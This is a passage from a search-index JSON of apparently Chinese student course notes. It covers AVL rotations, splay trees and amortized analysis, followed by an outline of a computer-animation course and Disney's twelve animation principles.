n_{h-1} + n_{h-2} + 1 ~~ \\Rightarrow ~~ n_h = F_{h+2} - 1 (h \\ge 0)\\) </li> <li>\\(F_i ~ \\approx ~ \\frac{1}{\\sqrt{5}} ( \\frac{1+\\sqrt{5}}{2} )^i ~~ \\Rightarrow ~~ n_h ~ \\approx ~ \\frac{1}{\\sqrt{5}} ( \\frac{1+\\sqrt{5}}{2} )^{h+2} - 1 ~~ \\Rightarrow ~~ h = O(log ~ n_h)\\) </li> <li>\\(n \\ge n_h ~~ \\Rightarrow ~~ h = O(log ~ n)\\) </li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/ADS/Lec01/#rotation", "title": "Rotation", "text": ""}, {"location": "Course/ADS/Lec01/#rr", "title": "RR", "text": "<p>Single Rotation</p> \u4f9d\u6b21\u63d2\u5165 Mar, May, Nov <p> \u4e0d\u5e73\u8861\u7684 \u201c\u53d1\u73b0\u8005\u201d \u662f Mar, \u201c\u9ebb\u70e6\u7ed3\u70b9\u201d Nov \u5728\u53d1\u73b0\u8005\u7684\u53f3\u5b50\u6811\u7684\u53f3\u8fb9\uff0c\u56e0\u800c\u53eb \u201cRR \u63d2\u5165\u201d\uff0c\u9700\u8981 \u201cRR \u65cb\u8f6c\u201d \u5373\u53f3\u5355\u65cb</p> <p></p>"}, {"location": "Course/ADS/Lec01/#ll", "title": "LL", "text": "<p>Single Rotation</p> \u518d\u4f9d\u6b21\u63d2\u5165 Aug, Apr <p> \u201c\u53d1\u73b0\u8005\u201d \u662f Mar, \u201c\u9ebb\u70e6\u7ed3\u70b9\u201d Apr \u5728\u53d1\u73b0\u8005\u7684\u5de6\u5b50\u6811\u7684\u5de6\u8fb9\uff0c\u56e0\u800c\u53eb \u201cLL \u63d2\u5165\u201d\uff0c\u9700\u8981 \u201cLL \u65cb\u8f6c\u201d \u5373\u5de6\u5355\u65cb</p> <p></p>"}, {"location": "Course/ADS/Lec01/#lr", "title": "LR", "text": "<p>Double Rotation</p> \u518d\u63d2\u5165 Jan <p> \u201c\u53d1\u73b0\u8005\u201d \u662f May, \u201c\u9ebb\u70e6\u7ed3\u70b9\u201d Jan \u5728\u53d1\u73b0\u8005\u7684\u5de6\u5b50\u6811\u7684\u53f3\u8fb9\uff0c\u56e0\u800c\u53eb \u201cLR \u63d2\u5165\u201d\uff0c\u9700\u8981 \u201cLR \u65cb\u8f6c\u201d</p> <p></p>"}, {"location": "Course/ADS/Lec01/#rl", "title": "RL", "text": "<p>Double Rotation</p> \u518d\u63d2\u5165 Dec, July, Feb <p> \u201c\u53d1\u73b0\u8005\u201d \u662f Aug, \u201c\u9ebb\u70e6\u7ed3\u70b9\u201d Feb \u5728\u53d1\u73b0\u8005\u7684\u53f3\u5b50\u6811\u7684\u5de6\u8fb9\uff0c\u56e0\u800c\u53eb \u201cRL \u63d2\u5165\u201d\uff0c\u9700\u8981 \u201cRL \u65cb\u8f6c\u201d</p> <p></p>"}, {"location": "Course/ADS/Lec01/#splay-trees-amortized-analysis", "title": "Splay Trees &amp; Amortized Analysis", "text": ""}, {"location": "Course/ADS/Lec01/#splay-trees", "title": "Splay Trees | \u4f38\u5c55\u6811", "text": "<p>Splay Tree - Definition</p> <p>A relatively simple date structure, known as splay tree, that guarantees that any m consecutive tree operations take at most \\(O(Mlog~N)\\) time.</p> <p>It means that the amortized time is \\(O(log~N)\\)  Any simgle operation might take \\(O(N)\\) time</p>"}, {"location": "Course/ADS/Lec01/#find", "title": "Find", "text": "<ul> <li>\u4f38\u5c55\u6811\u7684\u6838\u5fc3\u60f3\u6cd5\u662f: \u4e00\u4e2a\u8282\u70b9\u88ab\u8bbf\u95ee\u540e\uff0c\u901a\u8fc7\u4e00\u7cfb\u5217 AVL Tree \u7684\u65cb\u8f6c\u65b9\u6cd5\u5c06\u5b83\u8f6c\u81f3\u6839\u8282\u70b9</li> <li>\u5c1d\u8bd5\u5355\u65cb:<ul> <li></li> <li>\u53d1\u73b0 K<sub>3</sub> \u6c89\u5230\u4e86\u66f4\u5e95\u90e8</li> </ul> </li> <li> <p>\u7ed9\u51fa\u65b0\u7684\u65cb\u8f6c\u65b9\u6cd5: </p> <p>For any nonroot node X, denote its parent by P and grandparent by G: </p> <ul> <li>Case 1: P is the root \u2014\u2014&gt; Rotate X and P</li> <li> <p>Case 2: P is not the root </p> <ul> <li>Zig-zag: </li> <li>Zig-zig: </li> </ul> <p>\u7b2c\u4e00\u4e2a\u4e3a LR\uff0c \u7b2c\u4e8c\u4e2a\u4e3a\u4e24\u6b21 LL</p> </li> </ul> </li> <li> <p>\u90a3\u4e48\u5bf9\u4e8e\u5f00\u59cb\u7684\u56fe\u5f62\uff0c\u4f7f\u7528 Splay \u5f97\u5230 </p> <p>Splaying not only moves the accessed node to the root, but also roughly halves the depth of most nodes on the path.</p> </li> </ul> \u4e3e\u4e2a\u6817\u5b50 <p></p>"}, {"location": "Course/ADS/Lec01/#deletions", "title": "Deletions", "text": "<ul> <li>Step 1: Find X (X will be at the root)</li> <li>Step 2: Remove X (There will be two subtrees \\(T_L\\) and \\(T_R\\) )</li> <li>Step 3: FindMax( \\(T_L\\) ) (The largest element will be the root of \\(T_L\\) , and has no right child)</li> <li>Step 4: Make \\(T_R\\) the right child of the root of \\(T_L\\) </li> </ul>"}, {"location": "Course/ADS/Lec01/#amortized-analysis", "title": "Amortized Analysis | \u644a\u8fd8\u5206\u6790", "text": "Abstract <p>Almost the most difficult question in ADS</p> <ul> <li>worst-case bound \\(\\ge\\) amortized bound \\(\\ge\\) average-case bound</li> <li>\u5206\u6790\u65b9\u6cd5: <ul> <li>Aggregate analysis | \u805a\u5408\u5206\u6790</li> <li>Accounting method | \u6838\u7b97\u6cd5</li> <li>Potential method | \u52bf\u80fd\u65b9\u6cd5 (Highest-level)</li> </ul> </li> </ul>"}, {"location": "Course/ADS/Lec01/#aggregate-analysis", "title": "Aggregate Analysis", "text": "<p>Show that for all n, a sequence of n operations takes worst-case time \\(T(n)\\) in total. In the worst case, the average cost, or amortized cost per operation is \\(\\frac{T(n)}{n}\\) </p> Stack with MultiPop(int k, Stack S) <pre><code>Algorithm{\n    while(!IsEmpty(S) $$ k &gt; 0)\n    {\n        Pop(S);\n        k --;\n    }\n}\n</code></pre> <ul> <li>Consider a sequence of \\(n\\) Push, Pop, and MultiPop operations on an initially empty stack. (sizeof(S) \\(\\le n\\) )<ul> <li>\\(n\\) \u6b21\u64cd\u4f5c, push \u7684\u64cd\u4f5c \\(\\le n\\) (pop \u5fc5\u987b\u8981\u6709 push), \u6700\u591a\u7684\u8d39\u7528 \\(\\approx 2n-2\\)</li> <li>\\(T_{amortized} ~ = ~ O(n) / n ~ = ~ O(1)\\)</li> </ul> </li> </ul>"}, {"location": "Course/ADS/Lec01/#accounting-method", "title": "Accounting Method", "text": "<ul> <li>When an operation\u2019s amortized cost \\(\\hat{c_i}\\) exceeds its actual cost \\(c_i\\) , we assign the difference to specific objects in the data structure as credit (namely \\(\\Delta _i\\)). Credit can help pay for later operations whose amortized cost is less than their actual cost.</li> <li>\u201c\u52ab\u5bcc\u6d4e\u8d2b\u201d\uff0c\u5c06\u65f6\u95f4\u5212\u5206</li> </ul> \u67f1\u72b6\u56fe\u8868\u793a\u5404\u60c5\u51b5\u7684\u65f6\u95f4\u8d39\u7528 <ul> <li>\\(\\frac{\\sum \\hat{c_i}}{n} ~ = \\frac{\\sum c_i}{n} + \\frac{\\sum \\Delta _i}{n} ~ \\le ~ A\\) </li> <li>\u82e5\u5e0c\u671b \\(\\frac{\\sum \\hat{c_i}}{n} \\le A\\) (A \u4e3a\u67d0\u4e2a\u6570\u503c)\uff0c \u867d\u7136 \\(\\Delta _i\\) \u53d6\u503c\u90fd\u6709\u53ef\u80fd\uff0c\u4f46\u5982\u679c \\(\\frac{\\sum \\Delta _i}{n} \\ge 0\\) .</li> <li>\u6b64\u65f6\u5982\u679c\u53ef\u4ee5\u8bc1\u660e \\(\\frac{max \\sum \\hat{c_i}}{n} \\le A ~ \\approx ~ \\frac{\\sum c_i}{n} \\le A\\) (\u5176\u5b9e\u5c31\u7b49\u4ef7\u4e8e\u8ba1\u7b97\u6700\u5927\u7684\u644a\u8fd8\u8d39\u7528 \\(\\le A\\) , \u5373 worst-case \u4e0b\u8d39\u7528 \\(\\le A\\) )</li> </ul> Stack with MultiPop(int k, Stack S) <ul> <li>\\(c_i\\) for Push: 1; Pop: 1; MultiPop: min(sizeof(S), k)</li> <li>\\(\\hat{c_i}\\) for Push: 2; Pop: 0; MultiPop: 0</li> </ul> <p>Starting from an empty stack \u2014\u2014 Credits for</p> <ul> <li>Push: +1; Pop: -1; MultiPop: -1 for each +1 ( \\(\\sum Credits \\ge 0\\) )</li> <li>sizeof(S) \\(\\ge 0 ~~ \\Rightarrow ~~ Credits \\ge 0\\)</li> <li>\\(\\Rightarrow ~~ O(n) = \\sum\\limits_{i=1}^n \\hat{c_i} \\ge \\sum\\limits_{i=1}^n c_i\\) </li> <li>\\(\\Rightarrow ~~ T_{amortized} = O(n)/n = O(1)\\)</li> </ul>"}, {"location": "Course/ADS/Lec01/#potential-method", "title": "Potential Method", "text": "<ul> <li>Take a closer look at the credit \u2014\u2014 \\(\\hat{c_i} - c_i = Credit = \\Phi(D_i) - \\Phi(D_{i-1})\\) ( \\(\\Phi \\rightarrow Potential ~ function\\)  )</li> <li>\\(\\sum\\limits_{i=1}^n \\hat{c_i} = \\sum\\limits_{i=1}^n (c_i + \\Phi (D_i) - \\Phi (D_{i-1})) = (\\sum\\limits_{i=1}^n c_i) + \\Phi (D_n) - \\Phi (D_0)\\)</li> <li>\u5176\u4e2d, \\(\\Phi (D_n) - \\Phi (D_0) \\ge 0\\) (\u6211\u4eec\u5e0c\u671b\u505a\u5230 \\(\\Phi (D_0) = 0  ~,~ \\Phi(D_n) \\ge 0\\) , \\(\\Phi(D_0)\\) \u662f\u5e38\u6570\u4e5f\u6ca1\u6709\u95ee\u9898)</li> <li>In general, a good potential function should always assume its minimum at the start of the sequence</li> </ul> Stack with MultiPop(int k, Stack S) <ul> <li>\\(D_i\\) = the stack that results after the i -th operation </li> <li>\\(\\Phi (D_i)\\) = the number of objects in the stack \\(D_i\\)<ul> <li>\u5219 \\(\\Phi (D_i) \\ge 0 = \\Phi (D_0)\\)</li> <li>Push: \\(\\Phi (D_i) - \\Phi (D_{i-1}) = (sizeof(S) + 1) - sizeof(S) = 1\\)<ul> <li>\\(\\hat{c_i} = c_i + \\Phi (D_i) - \\Phi (D_{i-1}) = 1 + 1 = 2\\)</li> </ul> </li> <li>Pop: \\(\\Phi (D_i) - \\Phi (D_{i-1}) = (sizeof(S) - 1) - sizeof(S) = -1\\)<ul> <li>\\(\\hat{c_i} = c_i + \\Phi (D_i) - \\Phi (D_{i-1}) = 1 - 1 = 0\\)</li> </ul> </li> <li>MultiPop: \\(\\Phi (D_i) - \\Phi (D_{i-1}) = (sizeof(S) - k' ) - sizeof(S) = -k'\\)<ul> <li>\\(\\hat{c_i} = c_i + \\Phi (D_i) - \\Phi (D_{i-1}) = k' - k' = 0\\)</li> </ul> </li> </ul> </li> <li>\\(\\sum\\limits_{i=1}^n \\hat{c_i} = \\sum\\limits_{i=1}^n O(1) = O(n) \\ge (\\sum\\limits_{i=1}^n c_i) ~~ \\Rightarrow ~~ T_{amortized} = O(n)/n = O(1)\\)</li> </ul> <p>[example] : Splay Trees: \\(T_{amortized} = O(log N)\\) </p> <ul> <li>\\(D_i\\) = the root of the resulting tree</li> <li>\\(\\Phi(D_i)\\) : must increase by at most \\(O(log N)\\) over \\(n\\) steps, AND will also cancel out the number of rotations (zig: 1; zig-zag: 2; zig-zig: 2)</li> <li>\\(\\Phi(T) = \\sum\\limits_{i \\in T} log~S(i)\\) where \\(S(i)\\) is the number of descendants of \\(i\\) ( \\(i\\) itself included)</li> </ul> <p>\\(T\\) \u5373 \\(D(i)\\) , \\(log~S(i)\\) called Rank of the subtree \\(\\approx\\) Height of the tree</p> <ul> <li> <p>\\(\\Phi(T) = \\sum\\limits_{i \\in T} Rank(i)\\) </p> <ul> <li>Zig: <ul> <li>\\(\\hat{c_i} = 1 + R_2(X) - R_1(X) + R_2(P) - R_1(P)\\)</li> <li>\\(\\le 1 + R_2(X) - R_1(X)\\) ( \\(R_2(X)\\) \u8868\u793a\u65cb\u8f6c\u540e\u7684\u8fd9\u4e2a\u70b9\u7684\u52bf\u51fd\u6570)</li> </ul> </li> <li> <p>Zig-zag: </p> <ul> <li>\\(\\hat{c_i} = 2 + R_2(X) - R_1(X) + R_2(P) - R_1(P) + R_2(G) - R_1(G)\\)</li> <li>\\(\\le 2(R_2(X) - R_1(X))\\) </li> </ul> <p>\\((a+b)^2 \\ge 4ab ~~ \\Rightarrow ~~ 2log~(a+b) \\ge 2 + log~a + log~b\\) </p> </li> <li> <p>Zig-zig: </p> <ul> <li>\\(\\hat{c_i} = 2 + R_2(X) - R_1(X) + R_2(P) - R_1(P) + R_2(G) - R_1(G)\\)</li> <li>\\(\\le 3(R_2(X) - R_1(X))\\) </li> </ul> </li> <li>[Theorem] : The amortized time to splay a tree with root \\(T\\) at node \\(X\\) is at most \\(3(R(T) - R(X)) + 1 = O(log~N)\\) </li> </ul> </li> </ul>"}, {"location": "Course/Computer-Animation/", "title": "\u8ba1\u7b97\u673a\u52a8\u753b Overview", "text": "<p> \u7ea6 129 \u4e2a\u5b57 </p> <p>Content</p> <ul> <li> 1-\u8ba1\u7b97\u673a\u52a8\u753b\u7b80\u4ecb</li> <li> 2-\u52a8\u753b\u57fa\u672c\u539f\u5219</li> </ul> <ul> <li> 3-\u53d8\u6362\u548c\u65cb\u8f6c\u8868\u793a</li> <li> 4-\u4e8c\u7ef4\u591a\u8fb9\u5f62\u5f62\u72b6\u6e10\u53d8</li> <li> 5-\u4e8c\u7ef4\u56fe\u50cf Morphing</li> <li> 6-\u4e09\u7ef4 Morphing \u6280\u672f</li> <li> 7-\u7c92\u5b50\u7cfb\u7edf</li> <li> 8-\u7fa4\u7ec4\u52a8\u753b</li> <li> 9-\u5173\u8282\u52a8\u753b</li> <li> 10-\u53d8\u5f62\u52a8\u753b</li> <li> 11-\u5e03\u6599\u52a8\u753b</li> <li> 12-\u78b0\u649e\u68c0\u6d4b\u548c\u5904\u7406</li> <li> 13-\u9690\u51fd\u6570\u66f2\u9762\u9020\u578b\u548c\u52a8\u753b\u6280\u672f</li> </ul> <ul> <li> \u8003\u8bd5\u5927\u7eb2</li> </ul> <p>\u5174\u8da3\u6ca1\u90a3\u4e48\u5927, \u6682\u65f6\u5f03\u5751\u4e86</p> <p>Acknowledgement</p> <p>\u8ba1\u7b97\u673a\u52a8\u753b\u8bfe\u4ef6 @ \u91d1\u5c0f\u521a</p>"}, {"location": "Course/Computer-Animation/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8A%A8%E7%94%BB%E7%AE%80%E4%BB%8B/", "title": "\u8ba1\u7b97\u673a\u52a8\u753b\u57fa\u672c\u7b80\u4ecb", "text": "<p> \u7ea6 125 \u4e2a\u5b57 </p> <ul> <li>\u5e27\uff08Frame\uff09<ul> <li>\u52a8\u753b\u5229\u7528\u4e86\u4eba\u7684\u89c6\u89c9\u6b8b\u7559\u7279\u6027\u3002\u8fde\u7eed\u753b\u9762\u7684\u57fa\u672c\u5355\u4f4d\u4e3a\u5355\u5e45\u9759\u6001\u753b\u9762\uff0c\u5728\u56fe\u5f62\u5b66\u548c\u52a8\u753b\u4e2d\u79f0\u4e3a\u4e00\u5e27</li> </ul> </li> <li>\u5e27\u7387\uff08Frames Per Second, fps\uff09<ul> <li>\u6bcf\u79d2\u949f\u7ffb\u591a\u5c11\u5e27</li> </ul> </li> <li>\u573a\u548c\u5236\u5f0f<ul> <li>\u573a\uff08Field\uff09\u662f\u6307\u56fe\u50cf\u4e2d\u9694\u884c\u626b\u63cf\u7684\u67d0\u4e00\u534a\u626b\u63cf\u7ebf\uff0c\u5206\u5947\u573a\uff08Odd Field\uff09\u548c\u5076\u573a\uff08Even Field\uff09</li> <li>\u5947\u5076\u4e8c\u573a\u4ea4\u66ff\u663e\u793a\u6709\u6548\u63d0\u9ad8\u4e86\u753b\u9762\u53d8\u5316\u7684\u8fde\u7eed\u6027\uff0c\u51cf\u5c11\u4e86\u95ea\u70c1\u73b0\u8c61</li> </ul> </li> </ul>"}, {"location": "Course/Computer-Animation/2-%E5%8A%A8%E7%94%BB%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/", "title": "\u52a8\u753b\u57fa\u672c\u539f\u5219", "text": "<p> \u7ea6 1294 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>\u8fea\u58eb\u5c3c\u7684 12 \u6761\u52a8\u753b\u57fa\u672c\u539f\u5219</p> <ol> <li>Squash and Stretch (\u6324\u538b\u548c\u4f38\u5c55)<ul> <li>\u6324\u538b\u548c\u4f38\u5c55\u662f\u6307\u901a\u8fc7\u7269\u4f53\u7684\u5f62\u53d8\u6765\u8868\u73b0\u7269\u4f53\u7684\u521a\u5ea6\u548c\u8d28\u91cf</li> <li>\u5728\u4f7f\u7528\u201c\u6324\u538b\u548c\u4f38\u5c55\u201d\u539f\u5219\u65f6\uff0c\u901a\u5e38\u4f7f\u53d8\u5f62\u7684\u7269\u4f53\u4fdd\u6301\u5176\u4f53\u79ef\u4e0d\u53d8 </li> </ul> </li> <li>Anticipation\uff08\u9884\u671f\u6027\uff09<ul> <li>\u52a8\u753b\u4e2d\u7684\u52a8\u4f5c\u901a\u5e38\u5305\u62ec\u52a8\u4f5c\u7684\u51c6\u5907\u3001\u5b9e\u9645\u7684\u52a8\u4f5c\u548c\u52a8\u4f5c\u7684\u5b8c\u6210\u4e09\u90e8\u5206\u3002\u7b2c\u4e00\u90e8\u5206\u5c31\u53eb\u505a\u9884\u671f\u6027  </li> </ul> </li> <li>Staging\uff08\u5e03\u5c40\uff09<ul> <li>\u5e03\u5c40\u5c31\u662f\u4ee5\u4e00\u79cd\u5bb9\u6613\u7406\u89e3\u7684\u65b9\u5f0f\u5c55\u793a\u52a8\u4f5c\u6216\u5bf9\u8c61</li> <li>\u5728\u8bbe\u7f6e\u573a\u666f\u65f6\uff0c\u4e00\u4e2a\u81f3\u5173\u91cd\u8981\u7684\u56e0\u7d20\u662f\u8981\u8003\u8651\u5230\u89c2\u4f17</li> <li>\u89d2\u8272\u7684\u4eea\u6001\u53ca\u8868\u6f14\u65b9\u5f0f\uff0c\u914d\u5408\u9002\u5f53\u7684\u6444\u5f71\u673a\u8fd0\u52a8\uff0c\u4f7f\u5f97\u52a8\u753b\u80fd\u591f\u6709\u6548\u5730\u8868\u8fbe\u89d2\u8272\u7684\u7279\u6027\u53ca\u6545\u4e8b\u4e2d\u7684\u4fe1\u606f  </li> </ul> </li> <li>Straight-Ahead Action and Pose-to-Pose Action (\u8fde\u8d2f\u52a8\u4f5c\u6cd5\u4e0e\u5173\u952e\u52a8\u4f5c\u6cd5)<ul> <li>\u5c5e\u4e24\u79cd\u4e0d\u540c\u7684\u52a8\u753b\u5236\u4f5c\u65b9\u5f0f<ul> <li>\u524d\u8005\u6839\u636e\u8fde\u7eed\u7684\u52a8\u4f5c\u4f9d\u5e8f\u5236\u4f5c\u6bcf\u4e00\u5e27\u753b\u9762</li> <li>\u540e\u8005\u662f\u5148\u5b9a\u4e49\u5173\u952e\u7684\u4e3b\u8981\u52a8\u4f5c\uff0c\u800c\u540e\u518d\u5236\u4f5c\u5173\u952e\u52a8\u4f5c\u95f4\u7684\u753b\u9762 (\u5173\u952e\u5e27\u65b9\u6cd5)</li> </ul> </li> </ul> </li> <li>Follow-Through and Overlapping Action (\u8ddf\u968f\u52a8\u4f5c\u4e0e\u91cd\u53e0\u52a8\u4f5c)<ul> <li>\u6ca1\u6709\u4efb\u4f55\u4e00\u79cd\u7269\u4f53\u4f1a\u7a81\u7136\u505c\u6b62\uff0c\u7269\u4f53\u7684\u8fd0\u52a8\u662f\u4e00\u4e2a\u90e8\u5206\u63a5\u7740\u4e00\u4e2a\u90e8\u5206\u7684\u201d\uff0c\u8fd9\u662fWalt Disney\u5f53\u521d\u5bf9\u4e8e\u8fd0\u52a8\u7269\u4f53\u7684\u8be0\u91ca\uff0c\u4e4b\u540e\u52a8\u753b\u5e08\u5c06\u8fd9\u6837\u7684\u7406\u8bba\u4ee5\u8ddf\u968f\u52a8\u4f5c\u6216\u91cd\u53e0\u52a8\u4f5c\u6765\u79f0\u547c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u53e6\u4e00\u79cd\u66f4\u79d1\u5b66\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\u8fd9\u4e2a\u539f\u7406\uff0c\u5c31\u662f\u201c\u52a8\u8005\u6052\u52a8\u201d  </li> </ul> </li> <li>Slow In and Slow Out (\u6162\u5165\u548c\u6162\u51fa)<ul> <li>\u6240\u6709\u7269\u4f53\u81ea\u9759\u6b62\u5f00\u59cb\u8fd0\u52a8\uff0c\u9010\u6e10\u52a0\u901f\uff1b\u4ece\u8fd0\u52a8\u72b6\u6001\u56de\u5230\u9759\u6b62\u72b6\u6001\uff0c\u5219\u9010\u6e10\u51cf\u6162</li> <li>\u6162\u5165\u548c\u6162\u51fa\u662f\u6307\u52a8\u4f5c\u7684\u52a0\u901f\u548c\u51cf\u901f\u3002\u81ea\u7136\u754c\u4e2d\u7269\u4f53\u7684\u8fd0\u52a8\u5177\u6709\u52a0\u901f\u548c\u51cf\u901f\u7684\u6027\u8d28</li> <li>\u52a8\u4f5c\u7684\u6162\u5165\u548c\u6162\u51fa\u4f7f\u5f97\u7269\u4f53\u7684\u8fd0\u52a8\u66f4\u52a0\u7b26\u5408\u81ea\u7136\u89c4\u5f8b\uff0c\u56e0\u6b64\u5e94\u8be5\u5e94\u7528\u4e8e\u7edd\u5927\u591a\u6570\u7684\u52a8\u4f5c  </li> </ul> </li> <li>Arcs\uff08\u5f27\u5f62\u52a8\u4f5c\uff09<ul> <li>\u5728\u73b0\u5b9e\u4e16\u754c\u4e2d\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u8fd0\u52a8\u90fd\u662f\u6cbf\u7740\u4e00\u6761\u7565\u5e26\u5706\u5f27\u7684\u8f68\u9053\u79fb\u52a8\u7684, \u5c24\u5176\u662f\u751f\u7269\u7684\u8fd0\u52a8\u3002\u56e0\u6b64\uff0c\u5728\u5236\u4f5c\u52a8\u753b\u65f6\uff0c\u89d2\u8272\u7684\u8fd0\u52a8\u8f68\u8ff9\u5c31\u4e0d\u5e94\u662f\u76f4\u7ebf\uff0c\u800c\u5e94\u8be5\u662f\u6bd4\u8f83\u81ea\u7136\u7684\u66f2\u7ebf</li> <li>\u53ea\u6709\u5728\u7279\u6b8a\u7684\u60c5\u51b5\u4e0b\uff0c\u89d2\u8272\u6216\u8005\u89d2\u8272\u7684\u4e00\u90e8\u5206\u4f1a\u5b8c\u5168\u6cbf\u7740\u76f4\u7ebf\u8fd0\u52a8 </li> </ul> </li> <li>Secondary Motion\uff08\u9644\u5c5e\u8fd0\u52a8\uff09<ul> <li>\u5f53\u89d2\u8272\u8fdb\u884c\u4e3b\u8981\u52a8\u4f5c\u65f6\uff0c\u9644\u5c5e\u4e8e\u89d2\u8272\u7684\u90e8\u5206\uff0c\u4f8b\u5982\u89e6\u987b\u3001\u5c3e\u5df4\u7b49\uff0c\u4f1a\u4ee5\u9644\u5c5e\u52a8\u4f5c\u6765\u70b9\u7f00\u4e3b\u8981\u52a8\u4f5c\u7684\u6548\u679c (\u4e3a\u52a8\u753b\u589e\u6dfb\u4e50\u8da3\u548c\u771f\u5b9e\u6027)  </li> </ul> </li> <li>Timing\uff08\u638c\u63e1\u65f6\u5e8f\uff09<ul> <li>\u65f6\u95f4\u7684\u8c03\u914d\u548c\u9009\u62e9\u662f\u5f71\u54cd\u52a8\u753b\u6548\u679c\u7684\u6700\u5173\u952e\u56e0\u7d20\u4e4b\u4e00</li> <li>\u901a\u8fc7\u65f6\u5e8f\u6765\u8868\u73b0\u7269\u4f53\u7684\u5927\u5c0f\u3001\u91cd\u91cf\u548c\u4e2a\u6027</li> </ul> </li> <li>Exaggeration\uff08\u5938\u5f20\uff09<ul> <li>\u5938\u5f20\u624b\u6cd5\u7528\u4e8e\u5f3a\u8c03\u67d0\u4e2a\u52a8\u4f5c\uff0c\u4f46\u4f7f\u7528\u65f6\u5e94\u5c0f\u5fc3\u8c28\u614e\uff0c\u4e0d\u80fd\u968f\u610f\u3002\u4f7f\u7528\u5938\u5f20\u624b\u6cd5\u65f6\uff0c\u8981\u6ce8\u610f\u660e\u786e\u52a8\u4f5c\u6216\u8005\u5e8f\u5217\u7684\u8868\u73b0\u76ee\u6807\uff0c\u7136\u540e\u786e\u5b9a\u54ea\u4e00\u90e8\u5206\u9700\u8981\u5938\u5927\u8868\u73b0\u3002\u4f7f\u7528\u5938\u5f20\u7684\u7ed3\u679c\u901a\u5e38\u662f\u52a8\u753b\u66f4\u52a0\u771f\u5b9e\u548c\u6709\u8da3</li> </ul> </li> <li>Solid Drawing (not for 3D Animation)</li> <li>Appeal\uff08\u5438\u5f15\u529b\uff09<ul> <li>\u5438\u5f15\u529b\u662f\u6307\u4efb\u4f55\u89c2\u4f17\u613f\u610f\u89c2\u770b\u7684\u4e1c\u897f,\u4ee5\u8868\u73b0\u51fa\u89d2\u8272\u7684\u4e2a\u6027</li> <li>\u76ee\u6807\uff1a\u5efa\u7acb\u89d2\u8272\u4e0e\u89c2\u4f17\u7684\u67d0\u79cd\u8054\u7cfb</li> <li>\u5f53\u8bbe\u8ba1\u89d2\u8272\u65f6\uff0c\u4ee5\u72ec\u7279\u7684\u9020\u578b\u6216\u59ff\u6001\u6765\u63d0\u9ad8\u89c2\u4f17\u5bf9\u89d2\u8272\u7684\u5370\u8c61\u3002\u4f8b\u5982\u9ad8\u77ee\u80d6\u7626\u53ef\u5206\u522b\u4ee3\u8868\u89d2\u8272\u7684\u4e0d\u540c\u4e2a\u6027  </li> </ul> </li> </ol> <ul> <li>\u4e00\u4e9b\u884d\u751f\u7684\u539f\u5219    1. Depth of Field (\u666f\u6df1)<ul> <li>\u7b80\u5355\u5730\u6765\u8bf4\uff0c\u7126\u70b9\u9644\u8fd1\u7684\u7269\u4f53\u5f88\u6e05\u6670\uff0c\u800c\u79bb \u7126\u70b9\u8fdc\u7684\u666f\u7269\u53d8\u6a21\u7cca     2.  Balance &amp; Weight\uff08\u5e73\u8861\u53ca\u91cd\u91cf\u611f\uff09</li> <li>\u4e86\u89e3\u8fd0\u52a8\u7269\u4f53\u7684\u91cd\u5fc3\u6240\u5728\uff0c\u91cd\u5fc3\u7684\u4f4d\u7f6e\u53ef\u5f71\u54cd\u7269\u4f53\u5728\u89c6\u89c9\u4e0a\u7684\u7a33\u5b9a\u5ea6\uff1b \u7269\u4f53\u5728\u89c6\u89c9\u4e0a\u7684\u8f7b\u91cd\u5982\u4f55\uff0c\u9664\u4e86\u5728\u9020\u578b\u4e0a\u4e88\u4ee5\u5b9a\u4e49\u5916\uff0c\u4e5f\u9700\u7531\u52a8\u4f5c\u6765\u8868\u73b0\u7269\u4f53\u7684\u91cd\u91cf\u611f  </li> </ul> </li> </ul> <ul> <li>Spacetime Optimization<ul> <li>\u8ba1\u7b97\u673a\u81ea\u52a8\u751f\u6210\u53f0\u706f\u8df3\u8dc3\u52a8\u4f5c\u7684\u5e8f\u5217\u3002\u52a8\u753b\u5e08\u53ea\u7ed9\u5b9a\u4e86\u53f0\u706f\u7684\u8d77\u59cb\u4f4d\u7f6e\u548c\u7ec8\u70b9\uff0c \u6240\u6709\u7684\u4e2d\u95f4\u8df3\u8dc3\u8fc7\u7a0b\u7531\u8ba1\u7b97\u673a\u901a\u8fc7\u8ba1\u7b97\u81ea\u52a8\u5f97\u51fa\uff0c\u7528\u4e8e\u81ea\u52a8\u751f\u6210\u8fd9\u4e2a\u52a8\u753b\u5e8f\u5217\u7684\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e3b\u8981\u662f\u89e3\u7b97\u4e86\u4e00\u79cd\u540d\u4e3a Spacetime Optimization \u7684\u95ee\u9898 </li> </ul> </li> <li>\u7269\u7406\u539f\u7406<ul> <li>\u7269\u4f53\u53ef\u770b\u6210\u7531\u65e0\u6570\u5c0f\u7684\u7c92\u5b50\u7ec4\u6210\uff0c\u6211\u4eec\u8003\u8651\u5982\u4f55\u751f\u6210\u4e00\u4e2a\u5c0f\u7c92\u5b50\u7684\u52a8\u753b\u3002\u5047\u8bbe\u6709\u4e00\u4e2a\u5f88\u5c0f\u7684\u7c92\u5b50\uff0c\u5b83\u8eab\u4e0a\u643a\u5e26\u8fd9\u4e00\u4e2a\u5f88\u5c0f\u7684\u55b7\u5c04\u5f15\u64ce\uff0c\u8fd9\u4e2a\u5f15\u64ce\u53ef\u4ee5\u4ea7\u751f\u529b\u6765\u63a8\u52a8\u8fd9\u4e2a\u7c92\u5b50\u8fd0\u52a8</li> <li> <p>\u8ba1\u7b97\u673a\u53ef\u901a\u8fc7\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u81ea\u52a8\u4ea7\u751f\u5f15\u64ce\u7684\u55b7\u5c04\u529b\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u5c0f\u7c92\u5b50\u53ef\u4ee5\u4ece\u4e00\u5f00\u59cb \u7ed9\u5b9a\u7684\u521d\u59cb\u4f4d\u7f6e X(0)\uff0c\u8fd0\u52a8\u5230\u6211\u4eec\u60f3\u8ba9\u5b83\u8fbe\u5230\u7684\u7ec8\u70b9\u4f4d\u7f6e 